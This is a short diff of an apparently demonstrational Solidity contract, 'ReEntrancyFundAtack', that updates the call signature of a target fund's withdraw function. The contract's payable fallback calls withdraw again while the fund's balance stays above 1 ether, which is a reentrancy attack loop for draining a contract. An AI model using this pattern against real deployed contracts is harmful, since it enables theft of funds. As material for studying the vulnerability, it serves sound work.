@@ -20,13 +20,13 @@ contract ReEntrancyFundAtack {
 
 
     function startAtack()public{
-        fund.withdraw(0);
+        fund.withdraw(0, false);
     }
 
     // loop
     function() public payable {
         if(fundAddress.balance > 1 ether){
-            fund.withdraw(0);
+            fund.withdraw(0, false);
         }
     }
 }
